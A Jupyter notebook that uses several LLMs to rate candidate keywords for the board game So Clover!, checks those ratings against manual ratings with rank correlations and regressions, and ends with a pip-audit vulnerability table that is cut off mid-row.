In [ ]:
import sys
from collections import defaultdict
from itertools import combinations
from pathlib import Path
from statistics import correlation, mean

import litellm
import matplotlib.pyplot as plt
import numpy as np
from scipy.stats import kendalltau, rankdata
from sklearn.base import clone
from sklearn.compose import TransformedTargetRegressor
from sklearn.linear_model import LassoCV, LinearRegression, RidgeCV
from sklearn.model_selection import LeaveOneOut
from sklearn.pipeline import make_pipeline
from sklearn.preprocessing import StandardScaler
from tabulate import tabulate
from wordfreq import zipf_frequency
from words import get_words

# Add the repo root to sys.path so we can import our modules
repo_root = Path.cwd().resolve().parent
if str(repo_root) not in sys.path:
    sys.path.insert(0, str(repo_root))

from GenerateKeywordCards2.async_rng import AsyncRng  # noqa: E402
from GenerateKeywordCards2.check_familiarity import (  # noqa: E402
    check_familiarity_async,  # noqa: E402
)

# from asyncio import TaskGroup  <-- Doesn't work in Jupyter, use CompatTaskGroup instead.
from GenerateKeywordCards2.compat_task_group import (  # noqa: E402
    CompatTaskGroup as TaskGroup,  # noqa: E402
)
from GenerateKeywordCards2.manual_ratings import (  # noqa: E402
    add_manual_ratings_words,
    get_manual_ratings,
)
from GenerateKeywordCards2.rate_words import (
    RatingsByWord,  # noqa: E402
    WordAspects,
)
from GenerateKeywordCards2.rate_words_with_variations import (  # noqa: E402
    ModelParams,
    VariationParams,
    VariationView,
    iter_variation_views,
    rate_words_with_variations,
)

In [ ]:
# For some reason, the Ruff: Format Imports command fails with "unspecified reason" if these imports are in the same cell as the other imports.
from GenerateKeywordCards2.rate_words_with_variations import (  # noqa: E402
    combine_results,
    filter_results,
)

In [ ]:
litellm.cache = litellm.Cache(type="disk")

def get_cache_count()->int:
    disk_cache_object = litellm.cache.cache.disk_cache
    return len(disk_cache_object)

initial_cache_count = get_cache_count()

# Words

Get a large set of words in descending order of frequency. List examples of words at various positions in the list.

Most words become obscure or strange at around position 20,000 but some very recognizable words remaineven at position 50,000.

In [ ]:
all_words = get_words()

step = 5_000
segment_size = 20
indices = list(range(0, len(all_words) - segment_size, step))
if indices[-1] != len(all_words) - segment_size:
    indices.append(len(all_words) - segment_size)
for i in indices:
    segment = all_words[i : i + segment_size]
    frequency = zipf_frequency(segment[0], "en")
    print(f"{i} ({frequency}): {segment}")

# Check familiarity

Are the various models familiar with the game So Clover!?

In [ ]:
total_metadata = 0
tasks_by_model_params = {}
small_models = [
    "openai/gpt-5.4-mini-2026-03-17",
    "anthropic/claude-haiku-4-5-20251001",
    "gemini/gemini-3-flash-preview",
    "deepseek/deepseek-v4-flash",
]
async with TaskGroup() as tg:
    for model in small_models:
        tasks_by_model_params[model] = tg.create_task(
            check_familiarity_async(model), eager_start=True
        )

for model, task in tasks_by_model_params.items():
    familiarity, metadata = task.result()
    total_metadata += metadata
    familiarity_str = familiarity.replace("\n", " ")
    print(
        f"{model} ${metadata.total_cost:.4f} {metadata.output_tokens} output tokens: {familiarity_str}"
    )

print(total_metadata)

# Sample Rating Words

Select a representative set of words in a variety of ways to measure how well they will work as So Clover! keywords.

In [ ]:
# Initially, rate a small number of words with all small models.
initial_number_of_words = 3000

# Include the base game's words
existing_keywords_file = (
    repo_root / "GenerateKeywordCards" / "CloverExistingKeywords.csv"
)
existing_keywords = existing_keywords_file.read_text(encoding="utf-8-sig").splitlines()
existing_keywords = [w.lower() for w in existing_keywords]
assert len(existing_keywords) <= initial_number_of_words

# Sample remaining words from all_words
existing_keywords_set = set(existing_keywords)
all_words_without_existing = [w for w in all_words if w not in existing_keywords_set]
local_rng = AsyncRng(123).unwrap()
sampled_keywords = local_rng.sample(
    all_words_without_existing, k=initial_number_of_words - len(existing_keywords)
)

print(
    f"Selected {len(existing_keywords)} existing keywords and {len(sampled_keywords)} new keywords with all small models."
)
initial_words = existing_keywords + sampled_keywords

# Calculate Ratings

In [ ]:
models_params = [
    ModelParams(
        model="openai/gpt-5.4-mini-2026-03-17",
        reasoning_effort="none",
        batch_size_overall=300,
        batch_size_aspects=100,
    ),
    ModelParams(
        model="anthropic/claude-haiku-4-5-20251001",
        reasoning_effort="low",
        batch_size_overall=300,
        batch_size_aspects=50,
    ),
    ModelParams(
        model="gemini/gemini-3-flash-preview",
        reasoning_effort="none",
        batch_size_overall=300,
        batch_size_aspects=50,
    ),
    ModelParams(
        model="gemini/gemini-3.5-flash",
        reasoning_effort="none",
        batch_size_overall=300,
        batch_size_aspects=50,
    ),
    ModelParams(
        model="gemini/gemini-3.1-pro-preview",
        reasoning_effort="none",
        batch_size_overall=300,
        batch_size_aspects=100,
    ),
    ModelParams(
        model="deepseek/deepseek-v4-flash",
        reasoning_effort="none",
        batch_size_overall=300,
        batch_size_aspects=100,
    ),
    ModelParams(
        model="deepseek/deepseek-v4-pro",
        reasoning_effort="none",
        batch_size_overall=300,
        batch_size_aspects=100,
    ),
]

prompt_names = [
    "simple",
    "gameplay",
    "associations",
    "aspects_detailed",
]
results_by_variation_before_combining = await rate_words_with_variations(
    models_params, prompt_names, initial_words
)

# Cost

In [ ]:
print("Variation cost:")

total_metadata = 0
for variation in sorted(results_by_variation_before_combining.keys()):
    variation_result = results_by_variation_before_combining[variation]
    total_metadata += variation_result.metadata
    print(variation)
    print(
        f"  ${variation_result.metadata.total_cost:.4f} {variation_result.metadata.output_tokens:,} output tokens {variation_result.metadata.reasoning_tokens:,} reasoning tokens",
        flush=True,
    )

print(total_metadata)

# Add Combined Results

In [ ]:
combined_all_results = combine_results(
    iter_variation_views(results_by_variation_before_combining)
)

def get_combined_params(name: str):
    return VariationParams(
        model_params=ModelParams(
            model="z combined",
            reasoning_effort="default",
            batch_size_overall=0,
            batch_size_aspects=0,
        ),
        prompt_name=name,
    )

selected_names = [
    # From manual ratings greedy selections:
    "deepseek-v4-flash associations",
    "deepseek-v4-pro aspects_detailed [assoc]",
    "gpt-5.4-mini aspects_detailed [assoc]",
    "deepseek-v4-flash simple",
    # From highest rated existing keywords vs new keywords:
    "gemini-3.1-pro-preview associations",
    "gemini-3.5-flash associations",
    "gemini-3.1-pro-preview simple",
    "gemini-3-flash-preview associations",
]
combined_selected_results = combine_results(
    filter_results(
        iter_variation_views(results_by_variation_before_combining), selected_names
    )
)

combined_results_by_variation = {
    get_combined_params("all"): combined_all_results,
    get_combined_params("selected"): combined_selected_results,
}

print("Combined variations:")
for variation in combined_results_by_variation.keys():
    print(variation.short_str())

results_by_variation = results_by_variation_before_combining.copy()
results_by_variation.update(combined_results_by_variation)

# Examples

In [ ]:
for variation_view in iter_variation_views(results_by_variation):
    variation_result = variation_view.variation_result
    print(variation_view.short_str())

    sorted_by_ratings = sorted(
        initial_words,
        key=lambda w: variation_view.overall_rating(w),
        reverse=True,
    )
    number_of_examples = 10
    print(f"  best: {sorted_by_ratings[:number_of_examples]}")
    print(f"  worst: {sorted_by_ratings[-number_of_examples:]}")
    average_rating_existing_keywords = mean(
        variation_view.overall_rating(w) for w in existing_keywords
    )
    average_rating_new_keywords = mean(
        variation_view.overall_rating(w) for w in sampled_keywords
    )

# Compare existing Clover game words to random words 

In [ ]:
def get_percentage_of_existing_rated_higher_than_sampled(
    variation_view: VariationView,
) -> float:
    count_existing_higher = 0
    for w_existing in existing_keywords:
        rating_existing = variation_view.overall_rating(w_existing)
        for w_sampled in sampled_keywords:
            rating_new = variation_view.overall_rating(w_sampled)
            if rating_existing > rating_new:
                count_existing_higher += 1
    total_comparisons = len(existing_keywords) * len(sampled_keywords)
    if total_comparisons == 0:
        return 0.0
    percentage = (count_existing_higher / total_comparisons) * 100
    return percentage


print(
    "Percentage of comparisons where existing keywords are rated higher than new keywords:"
)
rows = []
for variation_view in iter_variation_views(results_by_variation):
    percentage = get_percentage_of_existing_rated_higher_than_sampled(variation_view)
    rows.append([variation_view.short_str(), percentage])
rows.sort(key=lambda r: r[1], reverse=True) # sort by percentage, highest first
print(tabulate(rows, headers=["Variation", "Percentage"], tablefmt="github", floatfmt=".1f"))

In [ ]:
print("Average ratings:")
for variation_view in iter_variation_views(results_by_variation):
    variation_result = variation_view.variation_result
    print(
        f"{variation_view.short_str()}: existing keywords={average_rating_existing_keywords:.1f}, new keywords={average_rating_new_keywords:.1f}"
    )

In [ ]:
print(
    "Histograms of ratings for new and existing keywords, for each model and variation:"
)

variations_per_row = 5
variation_view_count = len(list(iter_variation_views(results_by_variation)))
# Each row will have `variations_per_row` variations, except for the combined results at the end, which may not fit evenly into the rows.
assert (variation_view_count - len(combined_results_by_variation)) % variations_per_row == 0
nrows = (variation_view_count - 1) // variations_per_row + 1
fig, axes = plt.subplots(
    nrows=nrows,
    ncols=variations_per_row,
    figsize=(15, 2.5 * nrows),
    sharex=True,
    sharey=True,
    squeeze=False,
)
for i_variation, variation_view in enumerate(
    iter_variation_views(results_by_variation)
):
    ratings_existing_keywords = [
        variation_view.overall_rating(w) for w in existing_keywords
    ]
    ratings_new_keywords = [
        variation_view.overall_rating(w) for w in sampled_keywords
    ]
    i_column = i_variation % variations_per_row
    i_row = i_variation // variations_per_row
    ax = axes[i_row, i_column]
    ax.hist(ratings_existing_keywords, bins=range(1, 12), alpha=0.5, label="Clover game", color="green")
    ax.hist(ratings_new_keywords, bins=range(1, 12), alpha=0.5, label="random", color="orange")
    ax.set_xticks([x + 0.5 for x in range(1, 11)], labels=range(1, 11))
    ax.tick_params(axis="x", labelbottom=True)
    model_str = variation_view.variation_params.model_params.short_str()
    title_model = model_str if i_column == 0 else ""
    title_prompt = variation_view.short_str().replace(f"{model_str} ", "")
    title = f"{title_model}\n{title_prompt}"
    ax.set_title(title, fontsize=8)
    if i_column == 0 and i_row == 0:
        ax.legend()

fig.tight_layout()
plt.show()

# Correlation between LLM models

In [ ]:
print(
    "Kendall rank correlation between ratings of each model/variation with each other model/variation:\n"
)

rows = []
for iA, variation_view_A in enumerate(iter_variation_views(results_by_variation)):
    row = [variation_view_A.short_str()]
    for iB, variation_view_B in enumerate(iter_variation_views(results_by_variation)):
        if iA == iB:
            row.append("")
            continue

        ratings_A_list = [variation_view_A.overall_rating(w) for w in initial_words]
        ratings_B_list = [variation_view_B.overall_rating(w) for w in initial_words]
        # Use kendall_tau correlation because we are more concerned with the relative ranking of words than the absolute rating values.
        # kendall_tau is more robust to different rating scales and non-linear relationships.
        # correlation_value = correlation(ratings_A_list, ratings_B_list)
        kendall_tau_value = kendalltau(ratings_A_list, ratings_B_list)
        row.append(kendall_tau_value.correlation)
    rows.append(row)

header = [""] + [
    variation_view.short_str()
    for variation_view in iter_variation_views(results_by_variation)
]
print(tabulate(rows, headers=header, tablefmt="github", floatfmt=".2f"))

# Establish Manual Ratings

Manually rate words for which there is disagreement of the LLMs.

In [ ]:
percentile_ranks_by_variation = {}
for variation_view in iter_variation_views(results_by_variation_before_combining):
    ratings = [variation_view.overall_rating(w) for w in initial_words]
    ranks = rankdata(ratings, method="average")
    percentiles = [(r - 1) / (len(ranks) - 1) * 100 for r in ranks]
    percentile_ranks_by_variation[variation_view.get_hash_key()] = dict(zip(initial_words, percentiles))

mean_pairwise_percentile_difference_by_word = {}
for word in initial_words:
    percentiles = [
        percentile_ranks_by_variation[variation_view.get_hash_key()][word]
        for variation_view in iter_variation_views(
            results_by_variation_before_combining
        )
    ]
    pair_differences = [abs(a - b) for a, b in combinations(percentiles, 2)]
    mean_pairwise_percentile_difference_by_word[word] = mean(pair_differences)

initial_words_sorted_by_consistency = sorted(
    initial_words, key=lambda w: mean_pairwise_percentile_difference_by_word[w]
)


def tabulate_difference_details(words: list[str]):
    mean_percentile_by_word = {}
    for word in words:
        mean_percentile_by_word[word] = mean(
            [
                percentile_ranks_by_variation[variation_view.get_hash_key()][word]
                for variation_view in iter_variation_views(results_by_variation_before_combining)
            ]
        )

    # Sort words by mean percentile, from highest to lowest.
    # This makes it easier to read the table to interpret high/low quality words next to one another.
    sorted_words = sorted(words, key=lambda w: mean_percentile_by_word[w], reverse=True)

    header = ["Variation"] + sorted_words
    rows = []

    rows.append(
        ["Mean Rating"] + [mean_percentile_by_word[word] for word in sorted_words]
    )

    rows.append(
        ["Mean Difference"]
        + [mean_pairwise_percentile_difference_by_word[word] for word in sorted_words]
    )

    for variation_view in iter_variation_views(results_by_variation_before_combining):
        row = [variation_view.short_str()]
        for word in sorted_words:
            percentile = percentile_ranks_by_variation[variation_view.get_hash_key()][word]
            row.append(percentile)
        rows.append(row)

    print(tabulate(rows, headers=header, tablefmt="github", floatfmt=".1f"))


number_of_consitency_examples = 25
print("Least consistent words:")
tabulate_difference_details(
    initial_words_sorted_by_consistency[-number_of_consitency_examples:]
)
print("\nMost consistent words:")
tabulate_difference_details(
    initial_words_sorted_by_consistency[:number_of_consitency_examples]
)

# Enable this to update the manual ratings with the leeast consistent words.
# Do this when the set of models/prompts have been updated and are willing to make additional manual ratings.
should_add_manual_ratings = False
if should_add_manual_ratings:
    number_of_manual_ratings = 50
    add_manual_ratings_words(
        initial_words_sorted_by_consistency[-number_of_manual_ratings:]
    )

# Use Manual Ratings to Evaluate Overall LLM Ratings

In [ ]:
manual_ratings = get_manual_ratings()
manual_ratings_words = sorted(manual_ratings.keys())

# Rating fields should be the same for all words
# Note that here we're depending on the order of fields used by get_manual_ratings().
rating_fields = list(manual_ratings[manual_ratings_words[0]].keys())
for word in manual_ratings_words:
    assert list(manual_ratings[word].keys()) == rating_fields

print("Kendall rank correlation between manual ratings and model ratings:")
rows = []
fields_to_display = ["Association Overall", "Gameplay Overall"]
for variation_view in iter_variation_views(results_by_variation):
    row = []
    for field in fields_to_display:
        manual_ratings_for_field = [manual_ratings[w][field] for w in manual_ratings_words]
        model_ratings_for_field = [
            variation_view.overall_rating(w) for w in manual_ratings_words
        ]
        if row == []:
            row.append(variation_view.short_str())
        tau = kendalltau(manual_ratings_for_field, model_ratings_for_field).statistic
        row.append(tau)
    rows.append(row)

rows.sort(key=lambda r: r[1], reverse=True) # sort by association overall, least difference first

print(
    tabulate(
        rows,
        headers=["Variation"] + fields_to_display,
        tablefmt="github",
        floatfmt=".2f",
    )
)

In [ ]:
greedy_names = []
greedy_tau = -1.0
greedy_results = None
while True:
    next_tau_by_variation = {}
    for variation_view in iter_variation_views(results_by_variation_before_combining):
        if variation_view.short_str() in greedy_names:
            continue
        manual_ratings_list = [manual_ratings[w]["Association Overall"] for w in manual_ratings_words]
        greedy_results = combine_results(filter_results(iter_variation_views(results_by_variation_before_combining), greedy_names + [variation_view.short_str()]))
        combined_ratings_list = [
            greedy_results.ratings_by_word[w]["overall"] for w in manual_ratings_words
        ]
        tau = kendalltau(manual_ratings_list, combined_ratings_list).statistic
        next_tau_by_variation[variation_view.short_str()] = tau

    best_next_variation, best_next_tau = max(
        next_tau_by_variation.items(), key=lambda item: item[1]
    )
    if best_next_tau > greedy_tau:
        greedy_names.append(best_next_variation)
        greedy_tau = best_next_tau
        print(f"Added {best_next_variation} -> tau={best_next_tau:.3f}")
    else:
        print(f"Done. Stopped before adding {best_next_variation} -> tau={best_next_tau:.3f}.")
        break

assert greedy_results is not None
greedy_combined_params = get_combined_params("greedy")
combined_results_by_variation[greedy_combined_params] = greedy_results
results_by_variation = results_by_variation_before_combining.copy()
results_by_variation.update(combined_results_by_variation)
print(f"Added {greedy_combined_params.short_str()} to results_by_variation.")

In [ ]:
for target_field in fields_to_display:
    for variation_view in iter_variation_views(results_by_variation):
        words_by_coordinate = defaultdict(list)
        for word in manual_ratings_words:
            manual_rating = manual_ratings[word][target_field]
            model_rating = variation_view.overall_rating(word)
            words_by_coordinate[(manual_rating, model_rating)].append(word)

        plt.figure(figsize=(12, 6))
        cmap = plt.get_cmap("tab20")
        for i, (coordinate, words) in enumerate(words_by_coordinate.items()):
            color = cmap(i % cmap.N)
            manual_rating, model_rating = coordinate
            assert len(coordinate) > 0
            words_str = ", ".join(words)
            plt.scatter(
                manual_rating,
                model_rating,
                label=words_str,
                color=color,
            )
            x_offset = 0.1
            y_amt = 0.15
            y_offset = [-2, 1, -1, 2][int(manual_rating) % 4] * y_amt
            plt.text(
                manual_rating + x_offset,
                model_rating + y_offset,
                words_str,
                fontsize=8,
                ha="left",
                va="center",
                color=color,
            )
        plt.xticks(range(1, 11))
        plt.yticks(range(1, 11))
        plt.xlabel(f"Manual Rating {target_field}")
        plt.ylabel(f"{variation_view.short_str()}")
        plt.grid(True, alpha=0.3)
        plt.plot([1, 10], [1, 10], color="gray", alpha=0.2, linestyle="--")
        plt.show()

# Explore Aspects Ratings

Study the subfeatures of Association and Gameplay from the 'aspects' prompt.

In [ ]:
manual_ratings_by_field = {}
for field in rating_fields:
    manual_ratings_by_field[field] = [manual_ratings[w][field] for w in manual_ratings_words]

assert set(rating_fields) == set(WordAspects.get_rating_fields())

rows = []
for rbv_params, rbv_result in results_by_variation.items():
    if not rbv_params.is_aspects:
        continue
    row = [rbv_params.short_str()]
    for field in rating_fields:
        model_ratings_for_field = [rbv_result.ratings_by_word[w][field] for w in manual_ratings_words]
        tau = kendalltau(manual_ratings_by_field[field], model_ratings_for_field).statistic
        row.append(tau)
    rows.append(row)

print(
    tabulate(
        rows,
        headers=["Variation"] + rating_fields,
        tablefmt="github",
        floatfmt=".2f",
    )
)

In [ ]:
def show_ratings_correlation_matrix(ratings_by_word: RatingsByWord, ratings_title: str) -> None:
    rating_fields_count = len(rating_fields)
    ratings_words = sorted(ratings_by_word.keys())

    corr_matrix = [[0.0] * rating_fields_count for _ in range(rating_fields_count)]
    for i, field_a in enumerate(rating_fields):
        for j, field_b in enumerate(rating_fields):
            if i == j:
                corr_matrix[i][j] = 1.0
            else:
                ratings_a = [ratings_by_word[w][field_a] for w in ratings_words]
                ratings_b = [ratings_by_word[w][field_b] for w in ratings_words]
                corr_matrix[i][j] = correlation(ratings_a, ratings_b)

    short_fields = [f.replace("Association ", "A: ").replace("Gameplay ", "G: ") for f in rating_fields]

    fig, ax = plt.subplots(figsize=(12, 10))
    im = ax.imshow(corr_matrix, cmap="coolwarm", vmin=-1, vmax=1)
    plt.colorbar(im, ax=ax, label="Pearson Correlation")
    ax.set_xticks(range(rating_fields_count))
    ax.set_yticks(range(rating_fields_count))
    ax.set_xticklabels(short_fields, rotation=45, ha="right", fontsize=9)
    ax.set_yticklabels(short_fields, fontsize=9)
    for i in range(rating_fields_count):
        for j in range(rating_fields_count):
            ax.text(j, i, f"{corr_matrix[i][j]:.2f}", ha="center", va="center", fontsize=7)
    ax.set_title(f"Correlation Matrix of {ratings_title} Rating Fields")
    fig.tight_layout()
    plt.show()

show_ratings_correlation_matrix(manual_ratings, "Manual")
variation_ratings_to_correlate = []
for rbv_params, rbv_result in results_by_variation.items():
    if rbv_params.prompt_name.startswith(
        "aspects_"
    ) and rbv_params.model_params.model.startswith("deepseek/"):
        variation_ratings_to_correlate.append((rbv_params.short_str(), rbv_result.ratings_by_word))
for variation_name, variation_ratings in variation_ratings_to_correlate:
    show_ratings_correlation_matrix(variation_ratings, f"Model Variation: {variation_name}")

In [ ]:
target_fields = ["Association Overall", "Gameplay Overall"]

feature_sets = {
    "All non-overall fields": [f for f in rating_fields if f not in target_fields],
    "Association subratings only": [
        f
        for f in rating_fields
        if f.startswith("Association ") and f != "Association Overall"
    ],
    "Association subratings and Gameplay Overall": [
        f
        for f in rating_fields
        if (f.startswith("Association ") and f != "Association Overall") or f == "Gameplay Overall"
    ],
    "Gameplay subratings only": [
        f
        for f in rating_fields
        if f.startswith("Gameplay ") and f != "Gameplay Overall"
    ],
    "Gameplay subratings and Association Overall": [
        f
        for f in rating_fields
        if (f.startswith("Gameplay ") and f != "Gameplay Overall") or f == "Association Overall"
    ],
}

model_specs = {
    "OLS": make_pipeline(
        StandardScaler(),
        LinearRegression(),
    ),
    "RidgeCV": make_pipeline(
        StandardScaler(),
        RidgeCV(alphas=np.logspace(-3, 3, 25)),
    ),
    "LassoCV": make_pipeline(
        StandardScaler(),
        LassoCV(
            alphas=np.logspace(-3, 1, 25),
            max_iter=100_000,
            cv=5,
            random_state=0,
        ),
    ),
}


def standardize_y_model(model):
    return TransformedTargetRegressor(
        regressor=model,
        transformer=StandardScaler(),
    )


def get_final_estimator(fitted_model):
    # fitted_model is TransformedTargetRegressor
    pipeline = fitted_model.regressor_
    return pipeline[-1]


# Save particular coefficients for comparison with model results in later cells.
ridge_manual_coefficients_all_nonoverview_by_target_field = {}

for target_field in target_fields:
    y = np.array(
        [manual_ratings[w][target_field] for w in manual_ratings_words],
        dtype=float,
    )

    print(f"\n{'=' * 80}")
    print(f"Target: {target_field}")
    print(f"{'=' * 80}")

    for feature_set_name, feature_fields in feature_sets.items():
        if feature_set_name == "Association subratings and Gameplay Overall" and target_field == "Gameplay Overall":
            # This feature set would be circular for predicting Gameplay Overall, since it includes Gameplay Overall as a feature.
            continue
        if feature_set_name == "Gameplay subratings and Association Overall" and target_field == "Association Overall":
            # This feature set would be circular for predicting Association Overall, since it includes Association Overall as a feature.
            continue

        X = np.array(
            [
                [manual_ratings[w][f] for f in feature_fields]
                for w in manual_ratings_words
            ],
            dtype=float,
        )

        ss_tot = np.sum((y - y.mean()) ** 2)

        r2_rows = []
        coefs_by_model = {}

        for name, base_pipeline in model_specs.items():
            model = standardize_y_model(base_pipeline)

            fitted = clone(model).fit(X, y)
            r2_train = fitted.score(X, y)

            loo_preds = np.empty(len(y), dtype=float)

            for train_idx, test_idx in LeaveOneOut().split(X):
                fold_model = clone(model).fit(X[train_idx], y[train_idx])
                loo_preds[test_idx] = fold_model.predict(X[test_idx])

            r2_loo = 1 - np.sum((y - loo_preds) ** 2) / ss_tot

            final_estimator = get_final_estimator(fitted)
            alpha = getattr(final_estimator, "alpha_", "")

            r2_rows.append([name, r2_train, r2_loo, alpha])
            coefs_by_model[name] = final_estimator.coef_

            if name == "RidgeCV" and feature_set_name == "All non-overall fields":
                ridge_manual_coefficients_all_nonoverview_by_target_field[target_field] = (
                    final_estimator.coef_
                )

        print(
            f"\nFeature set: {feature_set_name}  (n={len(y)}, p={len(feature_fields)})"
        )
        print(
            tabulate(
                r2_rows,
                headers=["Model", "R² train", "R² LOO-CV", "Selected alpha"],
                tablefmt="github",
                floatfmt=".3f",
            )
        )

        print("")

        model_names = [name for name in model_specs]

        coef_rows = [
            [feature] + [coefs_by_model[name][i] for name in model_names]
            for i, feature in enumerate(feature_fields)
        ]

        # Sort by Ridge magnitude, because Ridge is usually more stable than OLS
        ridge_col_index = 1 + model_names.index("RidgeCV")
        coef_rows.sort(key=lambda row: abs(row[ridge_col_index]), reverse=True)

        print(
            tabulate(
                coef_rows,
                headers=["Feature"] + model_names,
                tablefmt="github",
                floatfmt=".3f",
            )
        )

In [ ]:
variation_ratings_to_regress = []
for rbv_params, rbv_result in results_by_variation.items():
    if rbv_params.prompt_name.startswith("aspects_"):
        variation_ratings_to_regress.append(
            (rbv_params.short_str(), rbv_result.ratings_by_word)
        )

for target_field in target_fields:
    print(f"\n{'=' * 80}")
    print(f"Target: {target_field}")
    print(f"{'=' * 80}")

    feature_set_name = "All non-overall fields"
    feature_fields = feature_sets[feature_set_name]
    training_rows = [[variation_name[0]] for variation_name in variation_ratings_to_regress]
    coef_rows = [[feature_field] for feature_field in feature_fields]
    for i_feature, ridge_manual_coefficient in enumerate(ridge_manual_coefficients_all_nonoverview_by_target_field[target_field]):
        coef_rows[i_feature].append(ridge_manual_coefficient)
    for i_variation, (variation_name, variation_ratings) in enumerate(
        variation_ratings_to_regress
    ):
        y = np.array(
            [variation_ratings[w][target_field] for w in initial_words],
            dtype=float,
        )

        X = np.array(
            [[variation_ratings[w][f] for f in feature_fields] for w in initial_words],
            dtype=float,
        )

        model_name = "RidgeCV"
        base_pipeline = model_specs[model_name]
        model = standardize_y_model(base_pipeline)

        fitted = clone(model).fit(X, y)
        r2_train = fitted.score(X, y)
        final_estimator = get_final_estimator(fitted)
        alpha = getattr(final_estimator, "alpha_", "")
        training_rows[i_variation].extend([r2_train, alpha])

        coefs = final_estimator.coef_
        for i, feature in enumerate(feature_fields):
            coef_rows[i].append(coefs[i])

    print(
        tabulate(
            training_rows,
            headers=["Variation"] + ["R² train", "Selected alpha"],
            tablefmt="github",
            floatfmt=".3f",
        )
    )

    print()
    variation_names = [vn for vn, _ in variation_ratings_to_regress]
    print(
        tabulate(
            coef_rows,
            headers=["Feature", "Manually Rated"] + variation_names,
            tablefmt="github",
            floatfmt=".3f",
        )
    )

# LLM Cache Size

In [ ]:
final_cache_count = get_cache_count()
print(
    f"Cache count {final_cache_count}, new entries this run: {final_cache_count - initial_cache_count}"
)

# PIP Audit

Security check for packages that need to be updated.

In [1]:
# Add the repo root to sys.path so we can import our modules
from pathlib import Path
import sys
repo_root = Path.cwd().resolve().parent
if str(repo_root) not in sys.path:
    sys.path.insert(0, str(repo_root))
from GenerateKeywordCards2.pip_audit_with_urls import pip_audit_with_urls, pip_audit_summary  # noqa: E402

# !pip-audit
# pip_audit_summary()
pip_audit_with_urls()

# TODO: There is currently a vulnerability GHSA-r7w7-9xr2-qq2r in langchain-openai.
# However, I cannot update to the latest version because the updated langchain-openai requires openai>=2.24 but the latest stable litellm hard-pins openai==2.24.0.

Found 6 vulnerabilities in 3/210 dependencies.


| Name              | ID                                                                       | Aliases                                                                                                                                     | Version   | Fix Versions   | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
|:------------------|:-------------------------------------------------------------------------|:--------------------------------------------------------------------------------------------------------------------------------------------|:----------|:---------------|:----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| diskcache         | [PYSEC-2026-2447](https://osv.dev/vulnerability/PYSEC-2026-2447)         | [CVE-2025-69872](https://www.cve.org/CVERecord?id=CVE-2025-69872), [GHSA-w8v5-vhqr-4h9v](https://github.com/advisories/GHSA-w8v5-vhqr-4h9v) | 5.6.3     |                | <span title="DiskCache (python-diskcache) through 5.6.3 uses Python pickle for serialization by default. An attacker with write access to the cache directory can achieve arbitrary code execution when a victim application reads from the cache.">DiskCache (python-diskcache) through 5.6.3 uses Python pickle for serialization ...</span>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               